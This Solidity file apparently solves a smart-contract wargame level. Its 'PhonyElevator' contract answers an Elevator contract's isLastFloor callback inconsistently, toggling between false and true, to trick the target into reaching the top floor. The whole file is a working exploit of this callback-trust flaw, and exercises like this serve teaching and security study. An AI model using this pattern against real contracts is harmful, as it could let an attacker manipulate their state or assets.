import "./Elevator.sol";

pragma solidity ^0.5.0;

contract PhonyElevator {
    bool public toggle;
    Elevator public target;


    constructor(address targetAddress) public {
        target = Elevator(targetAddress);
        toggle = true;
    }

    function isLastFloor(uint) public returns (bool) {
        toggle = !toggle;
        return toggle;
    }

    function setTop() public {
        target.goTo(1);
    }
}